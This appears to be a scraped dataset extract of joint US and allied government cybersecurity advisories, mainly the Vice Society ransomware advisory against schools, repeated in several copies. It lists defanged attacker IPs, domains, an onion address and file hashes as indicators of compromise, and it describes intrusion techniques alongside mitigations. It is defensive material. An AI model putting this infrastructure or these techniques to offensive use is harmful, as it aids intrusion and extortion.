Install and regularly update antivirus and anti-malware software on all hosts.

Secure Remote Access

Only use secure networks.
Consider installing and using a VPN for remote access.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, the authoring agencies recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The authoring agencies recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Appendix B).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

The authoring agencies recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESPONDING TO RANSOMWARE OR EXTORTION INCIDENTS
If a ransomware or extortion incident occurs at your organization:

Follow the Ransomware Response Checklist on page 11 of the CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide.
Scan backups. If possible, scan backup data with an antivirus program to check that it is free of malware. This should be performed using an isolated, trusted system to avoid exposing backups to potential compromise.
Follow the notification requirements as outlined in your cyber incident response plan.

U.S. organizations: Report incidents to FBI at a local FBI Field Office or the FBI's 24/7 CyWatch at (855)292-3937 or cywatch@fbi.gov, CISA’s 24/7 Operations Center at SayCISA@cisa.gov or by calling 1-844-Say-CISA (1-844-729-2472), or the U.S. Secret Service (USSS) at a USSS Field Office.
Australian organizations: Visit cyber.gov.au or call 1300 292 371 (1300 CYBER 1) to report cybersecurity incidents and access alerts and advisories.
Canadian organizations: Report incidents by emailing CCCS at contact@cyber.gc.ca.
United Kingdom organizations: Report a significant cyber security incident: ncsc.gov.uk/report-an-incident (monitored 24 hours)


Apply incident response best practices found in the joint Cybersecurity Advisory, Technical Approaches to Uncovering and Remediating Malicious Activity, developed by CISA and the cybersecurity authorities of Australia, Canada, New Zealand, and the United Kingdom.

Note: The authoring agencies strongly discourage paying ransoms as doing so does not guarantee files and records will be recovered and may pose sanctions risks.
RESOURCES

The U.S. Department of State’s Rewards for Justice (RFJ) program offers a reward of up to $10 million for reports of foreign government malicious activity against U.S. critical infrastructure. See the RFJ website for more information and how to report information securely.
For more information on malicious cyber activity affiliated with the Iranian government- sponsored malicious cyber activity, see us-cert.cisa.gov/Iran and FBI’s Iran Threat page.
For information and resources on protecting against and responding to ransomware or extortion activity, refer to StopRansomware.gov, the U.S. centralized, whole-of-government webpage providing ransomware resources and alerts.
The joint advisory from the cybersecurity authorities of Australia, Canada, New Zealand, the United Kingdom, and the United States: Technical Approaches to Uncovering and Remediating Malicious Activity provides additional guidance when hunting or investigating a network and common mistakes to avoid in incident handling.
CISA offers a range of no-cost cyber hygiene services to help critical infrastructure organizations assess, identify, and reduce their exposure to threats. By requesting these services, organizations of any size could find ways to reduce their risk and mitigate malicious activity.
ACSC can provide tailored cyber security advice and assistance, reporting, and incident response support at cyber.gov.au and via 1300 292 371 (1300 CYBER1).

PURPOSE
This advisory was developed by U.S., Australian, Canadian, and UK cybersecurity authorities in furtherance of their respective cybersecurity missions, including their responsibilities to develop and issue cybersecurity specifications and mitigations.
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. FBI, CISA, NSA, USCC-CNMF, DoT, ACSC, CCCS, and NCSC do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring.
APPENDIX A: INDICATORS OF COMPROMISE
IP addresses and executables files are listed below. For a downloadable copy of IOCs, see AA22- 257A.stix.
IP Addresses

54.39.78,.,148
95.217.193,.,86
104.168.117,.,149
107.173.231,.,114
144.76.186,.,88
148.251.71,.,182
172.245.26,.,118
185.141.212,.,131
198.12.65,.,175
198.144.189,.,74

Note: Some of these observed IP addresses may be outdated. The authoring agencies recommend organizations investigate or vet these IP addresses prior to taking action, such as blocking.
Malicious Domains

newdesk,.,top
symantecserver,.,co
msupdate,.,us
msupdate,.,top
gupdate,.,us
aptmirror,.,eu
buylap,.,top
winstore,.,us
tcp443,.,org
mssync,.,one
upmirror,.,top
tcp443 (subdomain)
kcp53 (subdomain)

Files
Malicious files observed in this activity are identified in Table 1. Many of the below malicious files are masquerading as legitimate Windows files; therefore, file names alone should not be treated as an indicator of compromise. Note: For additional malicious files observed, see joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities.



 
APPENDIX B: MITRE ATT&CK TACTICS AND TECHNIQUES
Table 2 identifies MITRE ATT&CK Tactics and techniques observed in this activity.
 


Revisions

September 14, 2022: Initial Version






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-257a
41,"



Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
Actions to take today to mitigate cyber threats from ransomware:• Prioritize and remediate known exploited vulnerabilities.• Train users to recognize and report phishing attempts.• Enable and enforce multifactor authentication.
The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), and the Multi-State Information Sharing and Analysis Center (MS-ISAC) are releasing this joint CSA to disseminate IOCs and TTPs associated with Vice Society actors identified through FBI investigations as recently as September 2022. The FBI, CISA, and the MS-ISAC have recently observed Vice Society actors disproportionately targeting the education sector with ransomware attacks.
Over the past several years, the education sector, especially kindergarten through twelfth grade (K-12) institutions, have been a frequent target of ransomware attacks. Impacts from these attacks have ranged from restricted access to networks and data, delayed exams, canceled school days, and unauthorized access to and theft of personal information regarding students and staff. The FBI, CISA, and the MS-ISAC anticipate attacks may increase as the 2022/2023 school year begins and criminal ransomware groups perceive opportunities for successful attacks. School districts with limited cybersecurity capabilities and constrained resources are often the most vulnerable; however, the opportunistic targeting often seen with cyber criminals can still put school districts with robust cybersecurity programs at risk. K-12 institutions may be seen as particularly lucrative targets due to the amount of sensitive student data accessible through school systems or their managed service providers.
The FBI, CISA, and the MS-ISAC encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents.
Download the PDF version of this report: pdf, 521 KB
Download the IOCs: .stix 31 kb
Technical Details

Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 11. See MITRE ATT&CK for Enterprise for all referenced tactics and techniques.
Vice Society is an intrusion, exfiltration, and extortion hacking group that first appeared in summer 2021. Vice Society actors do not use a ransomware variant of unique origin. Instead, the actors have deployed versions of Hello Kitty/Five Hands and Zeppelin ransomware, but may deploy other variants in the future.
Vice Society actors likely obtain initial network access through compromised credentials by exploiting internet-facing applications [T1190]. Prior to deploying ransomware, the actors spend time exploring the network, identifying opportunities to increase accesses, and exfiltrating data [TA0010] for double extortion--a tactic whereby actors threaten to publicly release sensitive data unless a victim pays a ransom. Vice Society actors have been observed using a variety of tools, including SystemBC, PowerShell Empire, and Cobalt Strike to move laterally. They have also used “living off the land” techniques targeting the legitimate Windows Management Instrumentation (WMI) service [T1047] and tainting shared content [T1080].
Vice Society actors have been observed exploiting the PrintNightmare vulnerability (CVE-2021-1675 and CVE-2021-34527 ) to escalate privileges [T1068]. To maintain persistence, the criminal actors have been observed leveraging scheduled tasks [T1053], creating undocumented autostart Registry keys [T1547.001], and pointing legitimate services to their custom malicious dynamic link libraries (DLLs) through a tactic known as DLL side-loading [T1574.002]. Vice Society actors attempt to evade detection through masquerading their malware and tools as legitimate files [T1036], using process injection [T1055], and likely use evasion techniques to defeat automated dynamic analysis [T1497]. Vice Society actors have been observed escalating privileges, then gaining access to domain administrator accounts, and running scripts to change the passwords of victims’ network accounts to prevent the victim from remediating. 
Indicators of Compromise (IOCs)



Email Addresses


v-society.official@onionmail[.]org


ViceSociety@onionmail[.]org


OnionMail email accounts in the format of [First Name][Last Name]@onionmail[.]org



 



TOR Address


http://vsociethok6sbprvevl4dlwbqrzyhxcxaqpvcqt5belwvsuxaxsutyad[.]onion



 



IP Addresses for C2
Confidence Level


5.255.99[.]59
High Confidence


5.161.136[.]176
Medium Confidence


198.252.98[.]184
Medium Confidence


194.34.246[.]90
Low Confidence



See Table 1 for file hashes obtained from FBI incident response investigations in September 2022.
Table 1: File Hashes as of September 2022



MD5
SHA1


fb91e471cfa246beb9618e1689f1ae1d
a0ee0761602470e24bcea5f403e8d1e8bfa29832


 
3122ea585623531df2e860e7d0df0f25cce39b21


 
41dc0ba220f30c70aea019de214eccd650bc6f37


 
c9c2b6a5b930392b98f132f5395d54947391cb79



MITRE ATT&CK TECHNIQUES
Vice Society actors have used ATT&CK techniques, similar to Zeppelin techniques, listed in Table 2.
Table 2: Vice Society Actors ATT&CK Techniques for Enterprise



Initial Access


Technique Title
ID
Use


Exploit Public-Facing Application
T1190
Vice Society actors exploit vulnerabilities in an internet-facing systems to gain access to victims’ networks.


Valid Accounts
T1078
Vice Society actors obtain initial network access through compromised valid accounts.


Execution


Technique Title
ID
Use


Windows Management Instrumentation (WMI)
T1047
Vice Society actors leverage WMI as a means of “living off the land” to execute malicious commands. WMI is a native Windows administration feature.


Scheduled Task/Job
T1053
Vice Society have used malicious files that create component task schedule objects, which are often mean to register a specific task to autostart on system boot. This facilitates recurring execution of their code.


Persistence


Technique Title
ID
Use


Modify System Process
T1543.003
Vice Society actors encrypt Windows Operating functions to preserve compromised system functions.


Registry Run Keys/Startup Folder
T1547.001
Vice Society actors have employed malicious files that create an undocumented autostart Registry key to maintain persistence after boot/reboot.


DLL Side-Loading
T1574.002
Vice Society actors may directly side-load their payloads by planting their own DLL then invoking a legitimate application that executes the payload within that DLL. This serves as both a persistence mechanism and a means to masquerade actions under legitimate programs.


Privilege Escalation


Technique Title
ID
Use


Exploitation for Privilege Escalation
T1068
Vice Society actors have been observed exploiting PrintNightmare vulnerability (CVE-2021-1675 and CVE-2021-34527) to escalate privileges.


Defense Evasion


Technique Title
ID
Use


Masquerading
T1036
Vice Society actors may attempt to manipulate features of the files they drop in a victim’s environment to mask the files or make the files appear legitimate.


Process Injection
T1055
Vice Society artifacts have been analyzed to reveal the ability to inject code into legitimate processes for evading process-based defenses. This tactic has other potential impacts, including the ability to escalate privileges or gain additional accesses.


Sandbox Evasion
T1497
Vice Society actors may have included sleep techniques in their files to hinder common reverse engineering or dynamic analysis.


Lateral Movement


Technique Title
ID
Use


Taint Shared Content
T1080
Vice Society actors may deliver payloads to remote systems by adding content to shared storage locations such as network drives.


Exfiltration


Technique Title
ID
Use


Exfiltration
TA0010
Vice Society actors are known for double extortion, which is a second attempt to force a victim to pay by threatening to expose sensitive information if the victim does not pay a ransom.


Impact


Technique Title
ID
Use


Data Encrypted for Impact
T1486
Vice Society actors have encrypted data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources.


Account Access Removal
T1531
Vice Society actors run a script to change passwords of victims’ email accounts.




 
Mitigations

The FBI and CISA recommend organizations, particularly the education sector, establish and maintain strong liaison relationships with the FBI Field Office in their region and their regional CISA Cybersecurity Advisor. The location and contact information for FBI Field Offices and CISA Regional Offices can be located at www.fbi.gov/contact-us/field-offices and www.cisa.gov/cisa-regions, respectively. Through these partnerships, the FBI and CISA can assist with identifying vulnerabilities to academia and mitigating potential threat activity. The FBI and CISA further recommend that academic entities review and, if needed, update incident response and communication plans that list actions an organization will take if impacted by a cyber incident.
The FBI, CISA, and the MS-ISAC recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques and to reduce the risk of compromise by Vice Society actors:
Preparing for Cyber Incidents

Maintain offline backups of data, and regularly maintain backup and restoration.  By instituting this practice, the organization ensures they will not be severely interrupted, and/or only have irretrievable data.
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure. Ensure your backup data is not already infected.
Review the security posture of third-party vendors and those interconnected with your organization. Ensure all connections between third-party vendors and outside software or hardware are monitored and reviewed for suspicious activity.
Implement listing policies for applications and remote access that only allow systems to execute known and permitted programs under an established security policy.
Document and monitor external remote connections. Organizations should document approved solutions for remote management and maintenance, and immediately investigate if an unapproved solution is installed on a workstation.
Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).

Identity and Access Management

Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with National Institute of Standards and Technology (NIST) standards for developing and managing password policies.

Use longer passwords consisting of at least 8 characters and no more than 64 characters in length;
Store passwords in hashed format using industry-recognized password managers;
Add password user “salts” to shared login credentials;
Avoid reusing passwords;
Implement multiple failed login attempt account lockouts;
Disable password “hints”;
Refrain from requiring password changes more frequently than once per year unless a password is known or suspected to be compromised.Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.


Require phishing-resistant multifactor authentication for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems.
Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts.
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege. 
Implement time-based access for accounts set at the admin level and higher. For example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task.

Protective Controls and Architecture

Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement.
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Secure and closely monitor remote desktop protocol (RDP) use.

Limit access to resources over internal networks, especially by restricting RDP and using virtual desktop infrastructure. If RDP is deemed operationally necessary, restrict the originating sources and require MFA to mitigate credential theft and reuse. If RDP must be available externally, use a VPN, virtual desktop infrastructure, or other means to authenticate and secure the connection before allowing RDP to connect to internal devices. Monitor remote access/RDP logs, enforce account lockouts after a specified number of attempts to block brute force campaigns, log RDP login attempts, and disable unused remote access/RDP ports.



Vulnerability and Configuration Management

Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Organizations should prioritize patching of vulnerabilities on CISA’s Known Exploited Vulnerabilities catalog.
Disable unused ports.
Consider adding an email banner to emails received from outside your organization.
Disable hyperlinks in received emails.
Disable command-line and scripting activities and permissions. Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally.
Ensure devices are properly configured and that security features are enabled.
Disable ports and protocols that are not being used for a business purpose (e.g., RDP Transmission Control Protocol Port 3389).
Restrict Server Message Block (SMB) Protocol within the network to only access servers that are necessary, and remove or disable outdated versions of SMB (i.e., SMB version 1). Threat actors use SMB to propagate malware across organizations.

REFERENCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Resource to mitigate a ransomware attack: CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide.
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment.

REPORTING
The FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with Vice Society actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.
The FBI, CISA, and the MS-ISAC strongly discourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to a local FBI Field Office, or to CISA at SayCISA@cisa.dhs.gov or 1-844-Say-CISA (1-844-729-2472. SLTT government entities can also report to the MS-ISAC (SOC@cisecurity.org or 866-787-4722).
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. The FBI, CISA, and the MS-ISAC do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the FBI, CISA, or the MS-ISAC.

 
Revisions

September 6, 2022: Initial Version







This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1190', 'T1068', 'T1543.003', 'T1486', 'T1078', 'T1047', 'T1053', 'T1055', 'T1531', 'T1574.002', 'TA0010', 'T1080', 'T1036', 'T1547.001', 'T1497'}","



Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
Actions to take today to mitigate cyber threats from ransomware:• Prioritize and remediate known exploited vulnerabilities.• Train users to recognize and report phishing attempts.• Enable and enforce multifactor authentication.
The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), and the Multi-State Information Sharing and Analysis Center (MS-ISAC) are releasing this joint CSA to disseminate IOCs and TTPs associated with Vice Society actors identified through FBI investigations as recently as September 2022. The FBI, CISA, and the MS-ISAC have recently observed Vice Society actors disproportionately targeting the education sector with ransomware attacks.
Over the past several years, the education sector, especially kindergarten through twelfth grade (K-12) institutions, have been a frequent target of ransomware attacks. Impacts from these attacks have ranged from restricted access to networks and data, delayed exams, canceled school days, and unauthorized access to and theft of personal information regarding students and staff. The FBI, CISA, and the MS-ISAC anticipate attacks may increase as the 2022/2023 school year begins and criminal ransomware groups perceive opportunities for successful attacks. School districts with limited cybersecurity capabilities and constrained resources are often the most vulnerable; however, the opportunistic targeting often seen with cyber criminals can still put school districts with robust cybersecurity programs at risk. K-12 institutions may be seen as particularly lucrative targets due to the amount of sensitive student data accessible through school systems or their managed service providers.
The FBI, CISA, and the MS-ISAC encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents.
Download the PDF version of this report: pdf, 521 KB
Download the IOCs: .stix 31 kb
Technical Details

Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 11. See MITRE ATT&CK for Enterprise for all referenced tactics and techniques.
Vice Society is an intrusion, exfiltration, and extortion hacking group that first appeared in summer 2021. Vice Society actors do not use a ransomware variant of unique origin. Instead, the actors have deployed versions of Hello Kitty/Five Hands and Zeppelin ransomware, but may deploy other variants in the future.
Vice Society actors likely obtain initial network access through compromised credentials by exploiting internet-facing applications,. Prior to deploying ransomware, the actors spend time exploring the network, identifying opportunities to increase accesses, and exfiltrating data, for double extortion--a tactic whereby actors threaten to publicly release sensitive data unless a victim pays a ransom. Vice Society actors have been observed using a variety of tools, including SystemBC, PowerShell Empire, and Cobalt Strike to move laterally. They have also used “living off the land” techniques targeting the legitimate Windows Management Instrumentation (WMI) service, and tainting shared content,.
Vice Society actors have been observed exploiting the PrintNightmare vulnerability (CVE-2021-1675 and CVE-2021-34527 ) to escalate privileges,. To maintain persistence, the criminal actors have been observed leveraging scheduled tasks, creating undocumented autostart Registry keys, and pointing legitimate services to their custom malicious dynamic link libraries (DLLs) through a tactic known as DLL side-loading,. Vice Society actors attempt to evade detection through masquerading their malware and tools as legitimate files, using process injection, and likely use evasion techniques to defeat automated dynamic analysis,. Vice Society actors have been observed escalating privileges, then gaining access to domain administrator accounts, and running scripts to change the passwords of victims’ network accounts to prevent the victim from remediating. 
Indicators of Compromise (IOCs)

 

 

See Table 1 for file hashes obtained from FBI incident response investigations in September 2022.
Table 1: File Hashes as of September 2022

MITRE ATT&CK TECHNIQUES
Vice Society actors have used ATT&CK techniques, similar to Zeppelin techniques, listed in Table 2.
Table 2: Vice Society Actors ATT&CK Techniques for Enterprise


 
Mitigations

The FBI and CISA recommend organizations, particularly the education sector, establish and maintain strong liaison relationships with the FBI Field Office in their region and their regional CISA Cybersecurity Advisor. The location and contact information for FBI Field Offices and CISA Regional Offices can be located at www.fbi.gov/contact-us/field-offices and www.cisa.gov/cisa-regions, respectively. Through these partnerships, the FBI and CISA can assist with identifying vulnerabilities to academia and mitigating potential threat activity. The FBI and CISA further recommend that academic entities review and, if needed, update incident response and communication plans that list actions an organization will take if impacted by a cyber incident.
The FBI, CISA, and the MS-ISAC recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques and to reduce the risk of compromise by Vice Society actors:
Preparing for Cyber Incidents

Maintain offline backups of data, and regularly maintain backup and restoration.  By instituting this practice, the organization ensures they will not be severely interrupted, and/or only have irretrievable data.
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure. Ensure your backup data is not already infected.
Review the security posture of third-party vendors and those interconnected with your organization. Ensure all connections between third-party vendors and outside software or hardware are monitored and reviewed for suspicious activity.
Implement listing policies for applications and remote access that only allow systems to execute known and permitted programs under an established security policy.
Document and monitor external remote connections. Organizations should document approved solutions for remote management and maintenance, and immediately investigate if an unapproved solution is installed on a workstation.
Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).

Identity and Access Management

Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with National Institute of Standards and Technology (NIST) standards for developing and managing password policies.

Use longer passwords consisting of at least 8 characters and no more than 64 characters in length;
Store passwords in hashed format using industry-recognized password managers;
Add password user “salts” to shared login credentials;
Avoid reusing passwords;
Implement multiple failed login attempt account lockouts;
Disable password “hints”;
Refrain from requiring password changes more frequently than once per year unless a password is known or suspected to be compromised.Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.


Require phishing-resistant multifactor authentication for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems.
Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts.
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege. 
Implement time-based access for accounts set at the admin level and higher. For example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task.

Protective Controls and Architecture

Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement.
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Secure and closely monitor remote desktop protocol (RDP) use.

Limit access to resources over internal networks, especially by restricting RDP and using virtual desktop infrastructure. If RDP is deemed operationally necessary, restrict the originating sources and require MFA to mitigate credential theft and reuse. If RDP must be available externally, use a VPN, virtual desktop infrastructure, or other means to authenticate and secure the connection before allowing RDP to connect to internal devices. Monitor remote access/RDP logs, enforce account lockouts after a specified number of attempts to block brute force campaigns, log RDP login attempts, and disable unused remote access/RDP ports.



Vulnerability and Configuration Management

Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Organizations should prioritize patching of vulnerabilities on CISA’s Known Exploited Vulnerabilities catalog.
Disable unused ports.
Consider adding an email banner to emails received from outside your organization.
Disable hyperlinks in received emails.
Disable command-line and scripting activities and permissions. Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally.
Ensure devices are properly configured and that security features are enabled.
Disable ports and protocols that are not being used for a business purpose (e.g., RDP Transmission Control Protocol Port 3389).
Restrict Server Message Block (SMB) Protocol within the network to only access servers that are necessary, and remove or disable outdated versions of SMB (i.e., SMB version 1). Threat actors use SMB to propagate malware across organizations.

REFERENCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Resource to mitigate a ransomware attack: CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide.
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment.

REPORTING
The FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with Vice Society actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.
The FBI, CISA, and the MS-ISAC strongly discourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to a local FBI Field Office, or to CISA at SayCISA@cisa.dhs.gov or 1-844-Say-CISA (1-844-729-2472. SLTT government entities can also report to the MS-ISAC (SOC@cisecurity.org or 866-787-4722).
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. The FBI, CISA, and the MS-ISAC do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the FBI, CISA, or the MS-ISAC.

 
Revisions

September 6, 2022: Initial Version







This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-249a
42,"




Summary

Actions to take today to mitigate cyber threats from ransomware:• Prioritize and remediate known exploited vulnerabilities.• Train users to recognize and report phishing attempts.• Enable and enforce multifactor authentication.
Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), and the Multi-State Information Sharing and Analysis Center (MS-ISAC) are releasing this joint CSA to disseminate IOCs and TTPs associated with Vice Society actors identified through FBI investigations as recently as September 2022. The FBI, CISA, and the MS-ISAC have recently observed Vice Society actors disproportionately targeting the education sector with ransomware attacks.
Over the past several years, the education sector, especially kindergarten through twelfth grade (K-12) institutions, have been a frequent target of ransomware attacks. Impacts from these attacks have ranged from restricted access to networks and data, delayed exams, canceled school days, and unauthorized access to and theft of personal information regarding students and staff. The FBI, CISA, and the MS-ISAC anticipate attacks may increase as the 2022/2023 school year begins and criminal ransomware groups perceive opportunities for successful attacks. School districts with limited cybersecurity capabilities and constrained resources are often the most vulnerable; however, the opportunistic targeting often seen with cyber criminals can still put school districts with robust cybersecurity programs at risk. K-12 institutions may be seen as particularly lucrative targets due to the amount of sensitive student data accessible through school systems or their managed service providers.
The FBI, CISA, and the MS-ISAC encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents.
Download the PDF version of this report: pdf, 521 KB
Download the IOCs: .stix 31 kb

Technical Details

Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 11. See MITRE ATT&CK for Enterprise for all referenced tactics and techniques.
Vice Society is an intrusion, exfiltration, and extortion hacking group that first appeared in summer 2021. Vice Society actors do not use a ransomware variant of unique origin. Instead, the actors have deployed versions of Hello Kitty/Five Hands and Zeppelin ransomware, but may deploy other variants in the future.
Vice Society actors likely obtain initial network access through compromised credentials by exploiting internet-facing applications [T1190]. Prior to deploying ransomware, the actors spend time exploring the network, identifying opportunities to increase accesses, and exfiltrating data [TA0010] for double extortion--a tactic whereby actors threaten to publicly release sensitive data unless a victim pays a ransom. Vice Society actors have been observed using a variety of tools, including SystemBC, PowerShell Empire, and Cobalt Strike to move laterally. They have also used “living off the land” techniques targeting the legitimate Windows Management Instrumentation (WMI) service [T1047] and tainting shared content [T1080].
Vice Society actors have been observed exploiting the PrintNightmare vulnerability (CVE-2021-1675 and CVE-2021-34527 ) to escalate privileges [T1068]. To maintain persistence, the criminal actors have been observed leveraging scheduled tasks [T1053], creating undocumented autostart Registry keys [T1547.001], and pointing legitimate services to their custom malicious dynamic link libraries (DLLs) through a tactic known as DLL side-loading [T1574.002]. Vice Society actors attempt to evade detection through masquerading their malware and tools as legitimate files [T1036], using process injection [T1055], and likely use evasion techniques to defeat automated dynamic analysis [T1497]. Vice Society actors have been observed escalating privileges, then gaining access to domain administrator accounts, and running scripts to change the passwords of victims’ network accounts to prevent the victim from remediating. 
Indicators of Compromise (IOCs)



Email Addresses


v-society.official@onionmail[.]org


ViceSociety@onionmail[.]org


OnionMail email accounts in the format of [First Name][Last Name]@onionmail[.]org



 



TOR Address


http://vsociethok6sbprvevl4dlwbqrzyhxcxaqpvcqt5belwvsuxaxsutyad[.]onion



 



IP Addresses for C2
Confidence Level


5.255.99[.]59
High Confidence


5.161.136[.]176
Medium Confidence


198.252.98[.]184
Medium Confidence


194.34.246[.]90
Low Confidence



See Table 1 for file hashes obtained from FBI incident response investigations in September 2022.
Table 1: File Hashes as of September 2022



MD5
SHA1


